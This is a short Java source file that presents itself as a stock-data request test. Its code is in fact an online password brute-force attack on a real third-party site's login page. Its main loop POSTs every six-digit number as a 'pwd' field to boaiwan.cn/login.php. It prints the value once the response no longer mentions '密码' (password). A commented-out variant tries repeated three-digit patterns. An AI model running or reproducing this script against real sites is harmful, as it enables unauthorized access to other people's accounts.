package com.taylor.stock.request;

import tk.mybatis.mapper.util.StringUtil;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * @author taylor
 */
public class GuZhenRequestTest {
    public static String  getGuZhengData(String  stockCode) {
        try {
            StringBuilder buffer = new StringBuilder();

            String url = "http://www.boaiwan.cn/login.php?login&rid=183";
            //发送get请求
            URL serverUrl = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) serverUrl.openConnection();

            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("pwd",stockCode);
            conn.setRequestProperty("host", "http://www.boaiwan.cn/");
            conn.setRequestProperty("Referer","http://www.boaiwan.cn/");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36");
            conn.connect();
            //将返回的输入流转换成字符串
            OutputStream os =conn.getOutputStream();
            os.write(("pwd="+stockCode).getBytes());
            os.flush();
            InputStream inputStream = conn.getInputStream();
            InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
            BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
            String str;
            while ((str = bufferedReader.readLine()) != null) {
                buffer.append(str);
            }
            bufferedReader.close();
            inputStreamReader.close();
            // 释放资源
            inputStream.close();
            if (!StringUtil.isEmpty(buffer.toString())) {
                System.out.println(buffer.toString());
                return buffer.toString();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "";
    }

    public static void main(String... args) {
        for(int i=100000;i<999999;i++) {
            String guZhengData = getGuZhengData(i+"");
            if(!guZhengData.contains("密码")){
                System.out.println("密码是"+i);
                break;
            }
            System.out.println(i);
        }
        /*for(int i=100;i<999;i++) {
            String guZhengData = getGuZhengData(i+""+i);
            if(!guZhengData.contains("密码")){
                System.out.println("密码是"+i+"0"+i);
                break;
            }
            System.out.println(i+""+i);
        }*/
    }
}